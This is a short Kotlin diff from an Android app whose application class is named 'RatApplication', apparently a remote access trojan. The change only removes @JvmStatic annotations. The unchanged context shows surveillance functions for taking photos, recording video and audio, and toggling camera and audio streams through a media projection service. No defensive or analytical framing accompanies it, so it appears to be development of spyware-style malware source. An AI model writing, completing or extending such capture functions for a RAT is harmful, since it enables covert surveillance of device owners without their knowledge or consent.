@@ -59,7 +59,7 @@ class MediaProjectionService : Service() {
         private val cameraHandler = Handler(handlerThread.looper)
         private val executor = Executors.newSingleThreadExecutor()
 
-        @JvmStatic
+        
         fun setMediaProjectionData(resultCode: Int, data: Intent) {
             val context = RatApplication.getInstance() ?: return
             mediaProjectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
@@ -68,7 +68,7 @@ class MediaProjectionService : Service() {
             Log.d(TAG, "Media projection initialized")
         }
 
-        @JvmStatic
+        
         fun takePhoto(context: Context, cameraId: Int = 0, quality: Int = 90): Map<String, Any> {
             return try {
                 if (mediaProjection == null) {
@@ -120,7 +120,7 @@ class MediaProjectionService : Service() {
             }
         }
 
-        @JvmStatic
+        
         fun recordVideo(context: Context, durationMs: Long = 10000, quality: Int = MediaRecorder.OutputFormat.MPEG_4): Map<String, Any> {
             return try {
                 if (mediaProjection == null) {
@@ -160,7 +160,7 @@ class MediaProjectionService : Service() {
             }
         }
 
-        @JvmStatic
+        
         fun stopVideoRecording(): Map<String, Any> {
             return try {
                 if (!isRecordingVideo || mediaRecorder == null) {
@@ -178,7 +178,7 @@ class MediaProjectionService : Service() {
             }
         }
 
-        @JvmStatic
+        
         fun toggleCameraStream(context: Context, enable: Boolean): Map<String, Any> {
             isStreamingCamera = enable
             if (enable) {
@@ -234,7 +234,7 @@ class MediaProjectionService : Service() {
             isStreamingCamera = false
         }
 
-        @JvmStatic
+        
         fun recordAudio(context: Context, durationMs: Long = 10000, format: String = "amr"): Map<String, Any> {
             return try {
                 val file = createMediaFile(context, "AUD", if (format == "amr") "amr" else "mp4")
@@ -261,7 +261,7 @@ class MediaProjectionService : Service() {
             }
         }
 
-        @JvmStatic
+        
         fun toggleAudioStream(context: Context, enable: Boolean): Map<String, Any> {
             isStreamingAudio = enable
             if (enable) {
